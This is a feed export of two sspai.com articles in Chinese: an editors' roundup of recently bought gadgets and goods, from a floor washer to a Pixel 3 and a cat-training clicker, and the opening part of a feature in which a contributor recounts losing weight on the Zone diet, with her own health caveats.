[{"title":"新玩意 078｜少数派的编辑们最近买了啥？","date":"2021-09-16 09:24:02","description":"\n<h4>关于栏目</h4>\n<p>很多读者都会好奇少数派的编辑们到底平时都「买了啥」。我们希望通过「编辑部的新玩意」介绍编辑部成员们最近在用的新奇产品，让他们自己来谈谈这些新玩意的使用体验究竟如何。</p>\n<hr>\n<h2>\n<a class=\"ss-atUser\" data-mention=\"@Microhoo\" user-id=\"bs2ov15b34tch278dtj0\" href=\"https://sspai.com/u/Microhoo\">@Microhoo</a>：石头智能双刷洗地机 U10</h2>\n<ul>\n<li>产品来源：厂商送测</li>\n<li>参考价格：3499 元</li>\n</ul>\n<p>我觉得拖地是家庭清洁最麻烦的事儿之一，虽然也在使用拖地机器人，但我对它的定义只是「清理地面顽固灰尘」，很多时候不小心撒在地上的饮料、汤汁乃至来做客的狗子被我家大眼萌猫吓一地的尿渍，都不是拖地机器人可以胜任的；再而即便是可以清理，液体污渍也应该是即时处理的，但你很难指挥拖地机器人精确的清理这个区域。总而言之，每个家庭都依然需要一个拖把，手动拖把。</p>\n<p>但是传统拖把有一个很大的毛病就是需要洗，洗完还得拧干——这是我十万分不能接受的，而且其实你回忆家里曾有过的拖把，通常都是一支永远洗不净也拧不干（不滴水）的拖把——于是聪明勤劳的人类发明了洗地机。其实洗地机也不是啥新鲜玩意儿了，但我一直没有入手的原因是我觉得现有的大部分洗地机产品设计思路还是倾向于「扫拖一体」，也就是用一台机器实现扫地和拖地的需求，当然一机多用是伟大的愿景无可厚非，可我对拖地机的主要需求还是拖地，我想要有更多基于拖地场景的优化和巧思。石头是我一直喜欢和信任的品牌，第一时间拿到这台最新的洗地机 U10 后，是我想象中的好洗地机的样子。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c51g03db34t86phi8mkg.jpeg\"><figcaption>无挡边设计非常方便贴墙清洁</figcaption></figure><p>区别于市面上大部分洗地机，U10 采用了双滚刷设计，前刷后滚，后刷前推，这样的优势有两个，首先是滚刷内旋不仅可以更高效的卷入地面垃圾再由风道吸走（大部分单刷洗地机是将垃圾推至后方再由风道吸走，容易残留），包括拖地过程中产生的少量积水也可以在双旋的助力下更好地被清理；其次就是每次推拉的拖地都是单刷洗地机的两倍。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c51g03lb34t86tbbuqq0.jpeg\"><figcaption>单次推拉后残留的水渍只有薄薄一层，很快便被风干</figcaption></figure><p>从清洁能力上来讲，因为这是我第一次使用洗地机，所以不比较只说体验——出乎意料。前文提到我一直观望洗地机但没下手的原因是我还是把它视作「拖把」，并没有对其扫地功能多抱希望，相关功能我更期待扫地机器人或者吸尘器的表现，但因为需要测试产品性能所以不得不考核了一下它的扫拖能力，结果是鼓起了掌。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c51g045b34t86tbbuqqg.jpeg\"></figure><p>我家里养了很多植物，日常维护或者换盆的时候经常弄得一地泥水沙石混合物，往常这个时候因为有水我都不能用吸尘器处理，只能用无数纸巾一遍遍擦干净，这也可以模拟我们日常生活中或许因为待客落下的一地干湿垃圾场景；其次就是最常见的脏污重灾区厨房，我升级了一下难度直接在地上打碎了一个鸡蛋还淋上一些酱油，捡掉大的蛋壳后还余留了一些碎蛋壳。而且这里有一个隐藏难度就是我的地板是那种有纹理的哑光石材，相比大多数家庭使用的光面地砖和复合木地板其实清洁难度更大。</p>\n<p>这基本上对应了我们日常家庭中会出现的地面脏污极限，使用 U10 的 Auto 模式（U10 有自动模式（自动红外探测脏污程度调整清洁水量和吸力）和 MAX 模式的分别，后者会加大出水量，另外还有针对漫水地面的「吸水模式」）基本上拖拉两次就可以完全清理干净，拖把自清洁结束后再看也被整理得干净如新。不过值得一提的是这些复合垃圾特别是混合了酱油的蛋液虽然能把地面清理干净，但是后期清洗污水盒的时候还是很难受，所以还是希望大家都能小心生活。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c51g04lb34t866a7feeg.jpeg\"></figure><p>虽然石头洗地机 U10 的双滚刷和刮水板设计已经足以让它在拖地过程中尽可能实时保持洁净，但还是建议每次使用结束后进行一次完整的自清洁，机器会对滚刷和风道作全面的清洗。而这和充电都同步在一个小巧的充电底座上完成，只需要稍稍提起机器放入底座凹口即可，不需要麻烦的插拔电线或校准位置。</p>\n<p>说到提起机身，石头洗地机 U10 比普通拖把重多了，当然这是同类产品的毛病因为要塞入电机、电池和水箱等并不可避免，我这里主要想讲讲 U10 对「重」的善用和拖地压力。回想我们用普通拖把的时候，面对一些顽固污渍通常需要刻意下压拖布增加对地压力提高清洁效果，拖地机也是如此。</p>\n<p>石头洗地机 U10 罕见的把几乎所有重量都压在了两个刷头上，所以日常使用中不用刻意的下压机身就能实现非常贴合的对地压力，而别的产品未采用这种设计是因为这样做会影响我们拖动机器时所施加的力。</p>\n<p>任何拖地机都需要助力才能让使用者轻易自如的在地面拖动，几乎所有同类产品的助力都来自于滚刷运转与机身重量之间的平衡，通常都是讲重量分散到底盘的轮子上不断调节出一个完美的助力配比，这在单滚刷产品上导致的结果就是使用舒适和清洁效果两者不可兼得，甚至前推和后滚只能有一种好体验。</p>\n<p>但得益于 U10 双滚刷的设计，两个滚刷同步且逆向滚动，可以粗浅的视作其在地面的静止摩擦力为零，并且不受重力分配的影响，所以可以把所有的压力都放在滚刷上让它成为高效清洁的原动力。对于使用者来说，不仅可以轻易获得同等的前推后滚体验，也可以稍稍倾斜拉手角度就可以调整符合自己使用习惯的助力水平和拖动速度。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c51g04tb34t86phi8ml0.jpeg\"><figcaption>隐藏在机身的磁吸支架可以让机身在不倾漏水的情况下方便支立或清洁底部滚刷</figcaption></figure><p>从数据来看，石头洗地机 U10 一次满电可以在自动模式下运转 35 分钟或 280 平方米的清洁面积，因为除了底座也没有更好的放置区域（吸尘器或许会因为随手放在桌上忘记充电），所以基本上能保证一定程度上的「永不断电」，随取随用。</p>\n<p>从产品力上来讲，石头洗地机 U10 可以取代传统的扫把和拖把，同时也是扫地机器人、拖地机器人和吸尘器非常好的补充，并且不同于机器人因为算法或技术不断优化需要及时换代获得最好的体验，洗地机相对来说使用寿命更长；同时与很多年轻人买回家但父母永远鼓捣不明白的机器人相比，U10 学习成本更低、详细的语音引导乃至更低成本的耗材维护，也更适合落后于数码时代的父母使用，是每个家庭都应该拥有的通往舒适洁净之路的幸福助力。</p>\n<h2>@张奕源 Nick：Secret 止汗啫喱</h2>\n<ul>\n<li>入手渠道：淘宝自购</li>\n<li>参考价格：48 元</li>\n</ul>\n<p>这个止汗啫喱对我来说其实已经不算是新玩意儿，但恰好我最近又买了一瓶新的，加上南方的暑热到了最发汗的季节，所以放在新玩意儿里聊聊。</p>\n<p>腋下是人类出汗的重点区域，尤其在炎热的环境里出门溜达一天之后，腋下能明显感受到皮肤因为汗液沉积而发涩，很不舒服。不仅如此，腋下排汗还会导致部分朋友出现身体异味，无论自己还是别人闻到都不舒适。</p>\n<p>因此，我很早就开始使用止汗产品。而且我的原则是「无论别人怎么看，首先要确保自己舒服」，所以在换过多款产品后，我发现只有 Secret 的止汗产品能做到「止汗能力强的同时抹在身上不难受」，我也由此成为 Secret 止汗啫喱的长期使用者。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c51g055b34t866a7fef0.jpeg\"></figure><p>Secret 是一个美国品牌，从上个世纪五〇年代创立以来就一直专注于皮肤保养类产品（譬如剃须膏、止汗剂和防晒霜等）的开发。其中，Outlast 系列止汗剂又是 Secret 旗下的王牌产品，我最早也是在某个止汗品牌榜单上了解到了它。</p>\n<p>Secret 止汗啫喱分许多香型，我买的是无香款，这也是我认为每个人都能用的款型。啫喱本体就是透明的固体膏，瓶身开口处有滤孔，配合瓶内的旋拧挤压设计，可以把啫喱像挤饸饹面一样挤出来，然后直接涂抹在腋下。瓶口本身就有一定弧度，目的就是方便在腋下涂抹。虽然是无香款，但涂在身上还是会有淡淡的香味，不过香气很微弱，只有自己能闻到。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c51g05lb34t86phi8mlg.jpeg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c51g065b34t86phi8mm0.jpeg\"></figure><p>初次使用止汗啫喱可能需要适应一下它滑腻腻的感觉，好在涂在身上几分钟后就会适应并无感，不会造成困扰。</p>\n<p>这款产品的止汗能力很强，我在使用后能明显感觉到腋下汗味减少，而且能持续很久。我通常都是头天晚上睡前洗澡后涂抹，直到第二天晚上下班回家，腋下仍有清爽的感觉。止汗啫喱还很耐用，按照每天涂一次的频率计算，一瓶至少也能用一个季度。</p>\n<p>促使我在新玩意儿里推荐它的另外一个原因是最近黛西也开始用我的止汗啫喱了，并明确表示我在用的这款比她买的女士专用止汗剂好用很多。我稍微研究了一下她在用的产品，是常见的止汗乳液，据黛西反馈会导致腋下干涩。反过来再想，Secret 使用啫喱这种产品形态看来确有原因。</p>\n<p>不过，Secret 也同时生产止汗膏和止汗喷雾，适合不同场景（譬如止汗膏就偏向运动）。另外，除了使用止汗产品，想要保持腋下清爽干净，刮掉腋毛是最有效的方式。虽然刮腋毛在大多数人认知中还是部分女性为了漂亮才会做的事，但干净健康不分男女，推荐大家都试试。</p>\n<p>总体来说，止汗剂是个「不用也行，但用了就好开心」的小玩意儿，价格不高，而且能有效提升身体的舒爽感。除了腋下，它也能用在其它部位，如果你所在的城市还有一段闷热的时光需要度过，不妨搞一个试一试。</p>\n<h2>@北鸮：永生 601 12K 金尖钢笔</h2>\n<ul>\n<li>购买渠道：淘宝</li>\n<li>参考价格：189 元（不同颜色、外形定价略有差异）</li>\n</ul>\n<p>如果时间往前倒转几十年，英雄、永生、金星等等经典的钢笔品牌还家喻户晓时，任谁也想不到它们能走到现在这一步。金星几乎倒了，只在有订单时偶尔开机；永生没了，品牌授权给了几个大的商家；英雄还活着，只是没什么大的长进，赶上国笔复兴的热潮翻来覆去地折腾家里的老型号。</p>\n<p>我一直觉得永生挺可惜的。永生 101，经典的暗尖金笔，实际书写感受好过英雄 100；322，仿犀飞利的大包尖，有着独特的硬滑手感；和英雄 616 同级别的国民钢笔 612，带赛璐珞贴片外壳的 237，棱角分明大明尖的 500，还有挂着「幸福」标的金笔，这些都是经典，如果还活着，哪怕还留着模具，现在也能起死回生。但永生本厂并没有留到现在，它的品牌也在之前混乱的授权和假冒伪劣中逐渐黯淡。</p>\n<p>好在有一些厂子在拿到这个老品牌的授权之后，实实在在地想做一点好东西，比如上海格林。在拿到了永生 6 系列型号的授权之后，他们起初做了一大堆复刻和模仿，随后，搞出了 601。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c51g06lb34t854sepjug.jpeg\"></figure><p>这款钢笔延续了格林之前在 699 和 698 上采用的路线：抛弃常见的上墨器，在上墨方式上玩花板子。699 用了负压上墨，抄了百乐 823；698 用了活塞上墨，搞了个当时最热的全透示范。601 采用了更加少见的真空泵上墨装置，最重要的是，它终于没再带着什么太大的模仿痕迹，而是采用了永生老钢笔的经典暗尖造型，并且附上了有机顶珠和尾珠装饰。对于我这种喜欢玩各种上墨设计的人来说，永生 601 成了最方便的体验真空上墨的途径，拆解也很容易，不用再去淘老派克了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c51g06tb34t86tbbuqr0.gif\"></figure><p>永生 601 有钢尖版和 12K 金尖版。据说库存老金尖已经消耗光了，现在的 12K 金尖是 17 年重新生产。素质还可以，顺滑度适中，容易控制，不硬不挂纸，日用很合适，粗细表现也不错。日常拿来替代中性笔完全没问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c51g07lb34t86tbbuqrg.jpeg\"></figure><p>真空泵上墨最大的优点就是储墨量大，在完全移除了墨囊采用活塞完成真空设计之后，601 的上墨设计也更加稳定，日用已经没有什么问题。我挑了带有观墨窗的版本，倒是没有指望我能靠这六个小窗子观察剩余墨量，毕竟书写量在这儿放着，写完一管要好久，但就是好看，觉得有那股认真做事的老国笔的风味。</p>\n<h2>@吃派的水獭：八位堂 Xbox 遥控器</h2>\n<ul>\n<li>购买渠道：京东</li>\n<li>参考价格：￥89</li>\n</ul>\n<p>对于游戏主机来说，主要的功能是玩游戏，日常有个手柄控制就差不多够用了，一个真正的遥控器来控制多媒体播放，也算是相对小众的需求了，毕竟主机上的视频流媒体 App 大多都不能在内地正常使用，不过由于我个人经常用 Xbox 来看 YouTube、Netflix 上的内容，对我而言算是一个痒点。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/d735e245ba278bf41ad8b4f1d6c093c0.png\"></figure><p>正好发现八位堂最近出了款 Xbox 遥控器，让 Xbox 变身真正的「机顶盒」。整体做得很精致，白色的塑料机身，按键手感扎实，采用两节 7 号电池供电。最喜欢的是这个白色背光，碰一下就自动亮起，很优雅。</p>\n<p>在使用体验方面，由于是红外遥控，所以还是要对准 Xbox 才可以正常控制，不像蓝牙可以无视遥控角度。对于 YouTube、Netflix 等这种做了 TV 端 UI，适配良好的 App 用起来丝滑流畅，就像一个真正的遥控器，如果你的电视支持 HDMI CEC 还可以同步控制电视的音量。当然也有例外，那就是 B 站的 UWP 版，作为桌面端应用，开发似乎没有考虑到会有人用遥控器操作，游戏手柄还可以移动光标凑活用下，但遥控器用起来……总之就是很痛苦。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/c3dd97ea078c0f6fa40927a0b501dd0f.gif\"></figure><h2>@Kostya：Google Pixel 3</h2>\n<ul>\n<li>价格：458 元</li>\n<li>购买渠道：咸鱼二手手机店家</li>\n</ul>\n<p>这个「新玩意」实际上是个旧玩意。Pixel 3 发布于 2018 年，Snapdragon 845 处理器，4 GB RAM，我手里的这个是 64 GB 存储。尽管买来的时候是想把它当作备用机使用，但是这么一周多用下来，却越来越爱不释手，以至于除了微信和原神，我几乎所有其他用手机干的事情都放到了这台 Pixel 3 上。</p>\n<p>这次买之前还以为 Pixel 3 不能升级到 Android 12，直到前两天我才了解到官方对 Pixel 3 仍有支持。Material You 的灵动，是我特别喜欢 Android 12 的原因之一。根据壁纸更换系统主题的颜色是最明显的改变，但是其他的一些系统动画效果上的改变我也很中意，例如充电时的动画、锁屏时的动画等等，都非常让人感到惊喜。</p>\n<p>除了 Android 12 带来的视觉上的改变，作为常年的 iOS 用户，Android 本身带来的「自由感」是很新鲜的。就像昨天和编辑 @路中南 讨论的，Android 用户有很多选择 —— 从邮件服务到浏览器再到系统 UI，没有什么不可以。Pixel 作为 Google 官方手机，仍然提供了容易的 Bootloader 解锁选项，这意味着用户可以从更加深刻的层次对手机的使用进行定制，同时不会丧失太多系统的安全性能。<strong>这在 iOS 显然是不可想象的</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4b2lktb34tbhj2tbvbg.jpeg\"><figcaption>iPhone 什么时候来个 AoD？</figcaption></figure><p>Snapdragon 845，4 GB + 64 GB 的配置在今天动辄 12 GB + 512 GB 的市场「常态」面前显得微不足道，但是 Google 显然知道如何优化自家的手机。Android 12 Beta 的表现只能说是十分顺滑，无论是系统动画还是整体的流畅程度，都可以说是出乎意料的。当然，我没有安装「小而美」的微信，不知道如果真的跑起微信来会不会是另一番光景。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4b2ll5b34tbhvaut0g0.png\"><figcaption>可见，Pixel 3 的夜拍实力不俗。</figcaption></figure><p>另外，作为 Pixel 系列的「看家本领」，我也终于见识到了 Pixel 的相机。后置其貌不扬的主摄也可以在人像模式中「堪当大任」，后期还可以对景深、焦点和模糊程度进行调整来获得自己更加满意的 bokeh。尽管我拍人像的确不多，但是用它来拍物体也的确赏心悦目。此外，夜拍模式下 Pixel 的表现我觉得也和手里的 iPhone 12 难分伯仲，尽管 iPhone 12 的动态范围明显更好些，但是 Pixel 3 拍出的夜景似乎更加柔和。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4b2lllb34tbhfir78m0.jpeg\"><figcaption>Pixel 3 样张，清晰、层次分明。</figcaption></figure><p>作为二手机，我这台 Pixel 的电池也已经有些不行了。AccuBattery 显示的电池容量数据大约 75%，着实该换了。最近少数派也的确有一个 <a href=\"https://sspai.com/post/68213\" target=\"_blank\">DIY 换 Pixel 3 电池的帖</a> 可以参考；不过，目前我对这台手机的续航要求实在不高，所以并没有什么换电池的动力。</p>\n<p><strong>所以，把微信、原神这样的「脏活」「累活」交给 iPhone 12，我就可以惬意享受 Pixel 3 和 Android 12 带给我的一切了。</strong>上次有这种感觉，是 Nexus 5X 还活着的时候。</p>\n<h2>@泫__：HUAWEI Freebuds4 </h2>\n<ul>\n<li>购买渠道：淘宝自购</li>\n<li>价格：899 元</li>\n</ul>\n<p>随着真无线蓝牙耳机的不断普及，华为自家的真无线蓝牙耳机在 2021 年 6 月更新到了第四代，在发布的第一时间我就入手了这款耳机，体验至今。从一年半前开始使用 Freebuds3 到现在，上一代虽然已经满足了日常使用中大部分的需求点，但还是比较期待下一代产品能有什么新的改进。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_cugxuan/16296170282830.jpg\" alt=\"freebuds4\"><figcaption>freebuds4</figcaption></figure><p>我入手的是冰霜银的版本，这一代 Freebuds4 的颜值相比上一代有更多设计感。体积上比原来的 Freebuds3 小了一圈，外壳从原本的亮面材质变成了现在的磨砂质感，显得更有科技气息。使用下来最明显的变化是磨砂的充电盒不会沾染指纹，耳机上留下的指纹一般感知不明显。不用保护套，直接充电盒裸奔就变成了理所当然的事情。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_cugxuan/16296170283830.jpg\" alt=\"freebuds4\"><figcaption>freebuds4</figcaption></figure><p>单耳机柄的重量也从原来的 4.6g 变成 4.1g，看纸面参数只有 0.5g，但是换算下来有接近 10%，在佩戴舒适的体验上感知明显。在耳机形状的设计上也有了很大的不同，Freebuds3 在佩戴时间稍长会明显有戳耳道的感觉， 在 Freebuds4 上将耳机头部的尖角去掉，更显圆润，在佩戴体验上有了很大的优化。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_cugxuan/16296170283842.jpg\" alt=\"compare\"><figcaption>compare</figcaption></figure><p>最令人惊喜的是加入了多设备连接的功能（可以同时连接两个设备）。尽管这个功能还有很多稳定性和兼容性的问题可以优化，但这个功能的使用频率非常高。当你连接电脑平板等设备使用完之后，其他设备没有音频输出的时候，不需要再主动连接到手机连接耳机进行设备切换。 Freebuds4 和手机的蓝牙连接一直会保持，在手机上播放音频就会自动激活和手机的连接。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_cugxuan/16296170283855.jpg\" alt=\"manage\"><figcaption>manage</figcaption></figure><p>操作体验部分对比原有的 Freebuds3 增加了很多的新功能，可以设置双击和长按的操作以及滑动耳机柄调节音量的功能。</p>\n<p>对于作为最大卖点的半入耳式主动降噪，效果相比上一代有非常明显的进步，具体变化可以去看一下各大博主的测评，但是我认为耳压太大，开启的时候耳朵堵得慌，对于耳压的问题官方也推出了轻度模式和均衡模式，不过我日常使用基本没有开启。</p>\n<p>另外在体验上有个问题，同时连手机和 MacBook，MacBook 几乎不能用，在 2021 年 7 月更新的<code>v1.0.0.200</code>版本解决了这个问题，但是在 WiFi 和蓝牙干扰严重的办公区域还是会经常卡顿。另外在 MacBook Pro 的重连体验不好，离开较远断开之后需要手动重连，需要重度使用蓝牙耳机连接 MacBook 的朋友请慎重购买。</p>\n<h2>@宽治：训练用响片 </h2>\n<ul>\n<li>购入渠道：淘宝</li>\n<li>参考价格：6 元</li>\n</ul>\n<p>家里的小猫三个月大了。比起刚出生的时候，它身形增加了十多倍，可破坏力却可能增加了百倍。家里的毛毯、沙发、桌腿，当然还有我的胳膊和腿，都成了它「修炼武功」的道具，变得伤痕累累。</p>\n<p>既然它这么爱练功，我就想着是不是能给它一些引导，让它变成一只人见人爱的好猫。可问题是，之前就听说猫不像狗，一般不太愿意受训，是更加自由不羁的生物，那么我到底怎么才能让它「从了」我呢？</p>\n<p>然后，我就发现了响片这个神器。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/09/23d9046b02b47881410e01dd20ff81d4.jpg\"><figcaption>响片</figcaption></figure><p>在查阅了一些有关猫咪行为学的书籍之后，我决定使用响片来辅助我的训练。简单来说，使用响片大概有如下几个好处：</p>\n<ol>\n<li>响片非常便宜而且耐用。国外有些人爱用的充电款 Clicker 的维护成本可能有些高，但是我买的这款响片，是通过按压内部金属簧片发出声响的，结构简单，只要使用得当（比如别泡水），几乎不必担心损坏的问题。</li>\n<li>响片可以发出非常独特的声音。响片是通过声音帮助猫咪形成条件反射的，因此它的声音一定要能区别于日常普遍可以听到的其他声音。按压金属片的声音不能算有多独特，但是区别于日常声音的要求还是可以满足的。</li>\n<li>响片非常轻便，可以随身携带。使用响片的关键就是标记猫咪的优秀行为，随身携带有助于我们随时标记行为，让猫咪更快地了解我们的心意。</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/108208f310b3b52053cb765f2b99d1a3.gif\"><figcaption>来一波握手的训练效果</figcaption></figure><p>使用响片进行训练的基本原理就是：1. 先建立响片与食物之间的关联（每次按压必有好吃的）；2. 诱导猫咪做出想要看到的行为；3. 一旦出现指定行为，就按压响片予以标记，并给予奖赏；4. 重复这个过程。</p>\n<p>利用响片，我家的猫已经学会了过来、坐下、握手、high five、站立这几个动作，我接下来的目标是让它明白「不要啊」（标记否定性行为是个难点，还得花点时间）。使用下来，我觉得响片有点像《银河系漫游指南》里的 Babel Fish，是人类和猫沟通的翻译器。至少，我觉得这比假装猫可以听懂人话要靠谱多了。 </p>\n<h2>彩蛋🎉️</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c51g08lb34t86tbbuqsg.gif\"><figcaption>看 <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=656156847801\" target=\"_blank\">水獭</a> 爬上来监工！</figcaption></figure><p>🦦 少数派「监工水獭」摆件正式 <a href=\"https://item.taobao.com/item.htm?id=656156847801\" target=\"_blank\">上架预售</a> 啦，《新玩意》栏目特约上新特惠 ￥49（原价 ￥69），22 日开始按序发货。</p>\n<p><strong>如果你也想分享「新玩意」🔉：</strong></p>\n<p>很多读者表示自己也有一些希望分享的有趣产品。为了能让更多读者参与，我们决定在「新玩意」栏目最后添加一个新的版块，邀请大家来 Matrix 社区发表文章分享你的「新玩意」，你只需要：</p>\n<ul>\n<li>在标题中标注「新玩意」</li>\n<li>用 500-1000 字介绍产品</li>\n<li>配上 1-2 张产品的实拍图片</li>\n<li><strong>在网站个人信息中补充支付宝账号</strong></li>\n</ul>\n<p>成功入选栏目还可以得到 108 元的「剁手抚恤金」🧧。如果你有兴趣参与，就赶紧来稿吧！</p>\n<p><strong>内容声明</strong>：《新玩意》栏目如含有商务内容，将会在对应条目标注「广告」；来源为「厂商送测」的产品并无内容干涉。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a> ，了解更多的新玩意 🆒</p>\n<p>&gt; 特惠、好用的硬件产品，尽在 <a href=\"https://shop549593764.taobao.com/?spm=a230r.7195193.1997079397.2.2ddc7e0bPqKQHc\">少数派sspai官方店铺</a> 🛒</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68834"},{"title":"不劝你减肥，但是你可以来羡慕一下他们瘦下来后的样子","date":"2021-09-16 08:04:52","description":"\n<p>减肥，或者说「好身材」是每一个社会人疲惫时刻的英雄梦想，尽管我们不主张大家都有身材焦虑，也希望任何人都能自信乐观，但「肥胖」在大多数时候并不只是关系外表上的美丑，更有可能成为健康的负担疾病的温床。</p>\n<p>这一次我们不说教「你一定要减肥」，也不侃侃而谈「如何减肥」，我们邀请了一些曾因为各种原因决定减肥，并且成功的少数派编辑和社区作者来分享他们获得成功的故事，希望能给予你启发和鼓励。</p>\n<h2>\n<a class=\"ss-atUser\" data-mention=\"@克莱尔爱吃甜食\" user-id=\"bvo7jrdb34tf97mobaqg\" href=\"https://sspai.com/u/n1odqxz1\">@克莱尔爱吃甜食</a> 200 顿饭吃出腹肌，这种饮食方法让我又饱又瘦</h2>\n<p>大家好我是看名字就知道很爱吃甜食的克莱尔。夏天还没过，明显感觉想喝手打柠檬茶的心和身上无处可藏的肉越来越矛盾了。</p>\n<p>2020年疫情之后我开始接触 CrossFit 运动，之前已经在一篇<a href=\"https://sspai.com/post/64429\" target=\"_blank\">文章</a>里分享过运动的一些经验。文章中有提到一种帮助我在 6 周内减掉 5% - 6% 体脂的 Zone 区域饮食法。自从参加那次减肥营活动之后，我一直（或多或少）在坚持这种饮食方法。从视觉效果和运动表现来看， Zone 对我的效果挺好的，此处有对比图。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/11/d9e89673f25b0b0a685ce1f923814129.JPG\"><figcaption>左一为一年前，其他三张都是最近3个月</figcaption></figure><p>数据方面，我在开始尝试 Zone 区域饮食法之前大概是 54-55 kg ，腰围在 72 cm 左右，属于肚腩藏肉类型，当时坐在椅子上能摸到一圈软软的肥肉漏出来。断断续续尝试一年之后，目前体重在 53 kg 左右，腰围在 64 -65 cm 徘徊。幸运的时候，伸手按下去可以摸到藏在皮下脂肪下面的腹肌。</p>\n<p>这种饮食方法在其他方面也对我的生活有了很大的改变，运动表现方面就不说了，好的饮食搭配循序渐进的规律训练，一定会大幅度提高身体素质。在其他方面，区域饮食法也给了我一些想象不到的体验，比如不太常生病、身体恢复更快、舌苔没了、皮肤和气色好了。</p>\n<p>当然它也有一些不好的地方，<strong>你要说它能多好吃，那纯属自欺欺人</strong>。它需要的饮食支出也不小，而且在开始时需要给食物称重、洗菜切菜。但在减肥食谱中，我认为区域食谱的好处在于它处在一个还比较容易接受的范围里，它不要求将某项营养元素增加或减少到极致，什么都吃一点，也让减肥者的心理好受一点。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/11/e68dfb81aef2371a3fd86eb06e3b4e7f.JPG\"><figcaption>当时做的 meal prep，这里大概只有一天多一点的量</figcaption></figure><p>更重要的是，这种饮食方法教会我如何与身体沟通，如何读懂身体的信号，我是饿了还是渴了，我应该吃多少东西，我的身体需要什么。如果有这样的概念，无论在之后是减肥还是增肌，我认为都是在为健康打下良好基础。</p>\n<p>在介绍区域饮食法之前，我想提前说明：<strong>所有减肥方法都需要经过医生和专业教练的确认，如果是身体有疾病或者处于怀孕等特殊阶段的人，千万不要盲目尝试。区域饮食法目前没有经过严格科学论证，它不能治病，不是神药</strong>。</p>\n<h3>区域饮食法的原理</h3>\n<p>区域饮食法（ Zone Diet ）源于美国学者 Barry Sears ，他有生物化学博士文凭，但没有行医执照。Sears 家族中的几个男性都因为心脏病早早去世，因此 Sears 希望开发出一种减少身体炎症的饮食方法。</p>\n<p>1995 年，Sears 发表了《区域饮食法：一张饮食路线图》一书，之后又陆续出版了几本关于区域饮食法的著作。根据区域饮食法官方网站的介绍，它可以减少饮食引起的身体炎症、减重、增进精神与运动表现。在这种饮食原则下，人体的胰岛素水平将保持平稳状态，不会大起大落。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/11/e8a687a339dc5dac29f5a49093920f31.jpg\"></figure><p>那么 Zone 饮食法到底是如何衡量的？大方向说很简单，它要求使用者在一天中的每一餐中，都保证<strong> 40% 碳水化合物，30% 蛋白质与 30% 脂肪</strong>的营养搭配。碳水化合物要求避免高糖/高淀粉的水果蔬菜（葡萄干、土豆、玉米），转而选择大量、多种颜色的蔬菜，少量水果。</p>\n<p>蛋白质方面，Zone 每顿正餐需要的蛋白质大概是你的手掌大小与厚度的一块肉，优先考虑精瘦的肉类，比如瘦牛肉、鸡肉、鸡蛋、鱼类等，也可以考虑乳制品（但一些运动员认为乳制品会加重身体炎症，对于初学者来说则不必考虑这么多，你喜欢就好）。</p>\n<p>脂肪类，需要增加不饱和脂肪，可以比日常饮食中消耗更多的橄榄油、牛油果与无糖无盐果仁。简单说，<strong>Zone 就是限制淀粉摄入，最大限度增加蔬菜与低糖水果摄入，配以一些优质蛋白与脂肪。另外，使用这种减肥法也不可食用添加糖，尽量减少吃人工制品。</strong>我的教练当时给了一个选择标准：<strong>逛超市时，只能到生鲜区买食品原料，不能买有配料表的食物</strong>。（当然后面为了方便我还是吃了调味料、燕麦奶、火腿，也喝了蛋白粉）。</p>\n<p>接下来就是稍微复杂一些的实操阶段，Zone 饮食法要求每餐平衡这三种营养，但它们到底应该如何计算？首先可以点<a href=\"https://zonediet.com/resources/body-fat-calculator/\">这里</a>计算自己一天要吃几个 Block。如果懒得算，女生一般从 11 Block 开始，男生从 14 Block 开始。每个 Block 的碳水应该有 9 克，蛋白质为 7 克，脂肪则是 3 克。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/3d6a2ca3f6324215f7514d7d7cabcd58.png\"><figcaption>Zone 